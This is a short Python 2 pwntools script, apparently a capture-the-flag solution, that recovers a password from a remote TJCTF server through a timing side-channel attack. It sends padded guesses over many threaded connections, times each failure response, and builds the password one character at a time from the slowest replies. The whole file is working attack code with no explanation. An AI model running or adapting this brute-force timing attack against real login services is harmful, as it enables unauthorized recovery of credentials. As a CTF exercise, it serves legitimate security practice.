from threading import Thread
from pwn import *
from time import time,sleep
CHECKS='1000000'
steps=5
PASS=''
S=[0 for i in range(256)]
pr='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890++'
pr=[ord(x) for x in pr]
def g(p):
	S[p]=0
	print chr(p)
	L=[Thread(target=f,args=(p,)) for i in range(steps)]
	for x in L:
		x.start()
	for x in L:
		x.join()
	S[p]/=steps
	
def f(p):
	s=remote('problem1.tjctf.org','8003')
	s.recvuntil('password?')
	s.sendline(CHECKS)
	s.recvuntil(':')
	x=time()
	s.sendline(PASS+chr(p)+'\x00'*(499-len(PASS)))
	s.recvuntil('failed!')
	y=time()
	S[p]+=y-x
	s.close()

while(1):
	for i in range(0,len(pr),8):
		W=[Thread(target=g,args=(pr[j],)) for j in range(i,i+8)]
		for R in W:
			R.start()
		for R in W:
			R.join()
	l=S
	l=[(l[pr[i]],chr(pr[i])) for i in range(len(pr))]
	print list(reversed(sorted(l)))
	l=list(reversed(sorted(l)))
	p=0
	while(l[p][1]=='+'):
		p+=1
	PASS+=l[p][1]
	print PASS
